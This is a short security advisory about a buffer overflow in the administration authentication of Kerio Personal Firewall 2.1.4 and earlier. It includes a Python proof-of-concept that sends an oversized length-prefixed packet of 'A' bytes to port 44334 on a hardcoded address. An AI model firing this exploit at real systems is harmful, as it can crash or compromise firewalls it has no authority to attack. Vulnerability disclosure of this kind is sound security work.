source: http://www.securityfocus.com/bid/7180/info

A buffer-overflow vulnerability has been discovered in Kerio Personal Firewall. The problem occurs during the administration authentication process. An attacker could exploit this vulnerability by forging a malicious packet containing an excessive data size. The application then reads this data into a static memory buffer without first performing sufficient bounds checking. 

Successful exploits of this vulnerability may allow an attacker to execute arbitrary commands on a target system, with the privileges of the firewall. 

Note that this vulnerability affects Kerio Personal Firewall 2.1.4 and earlier.

import os
import socket
import struct
import string

def g():
     fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         fd.connect(('192.168.66.160', 44334))
         fd.recv(10)
         fd.recv(256)
         fd.send(struct.pack('!L', 0x149c))
         astr = 'A'*0x149c
         fd.send(astr)

     except Exception, e:
         print e
         pass

     fd.close()

g()
